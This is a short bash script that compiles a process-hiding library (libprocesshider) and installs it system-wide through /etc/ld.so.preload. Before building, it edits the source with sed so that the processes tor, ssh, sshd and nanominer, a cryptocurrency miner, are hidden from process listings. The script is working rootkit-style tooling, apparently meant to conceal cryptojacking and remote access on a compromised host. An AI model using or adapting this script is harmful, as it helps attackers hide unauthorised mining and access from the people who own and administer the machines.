#!/usr/bin/env bash

apt-get update && apt-get full-upgrade -y && apt-get -y dist-upgrade && apt-get -y autoremove --purge
apt-get install make gcc -y

sed -i '12s\evil_script.py\tor, ssh, sshd, nanominer\ ' processhider.c
make
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
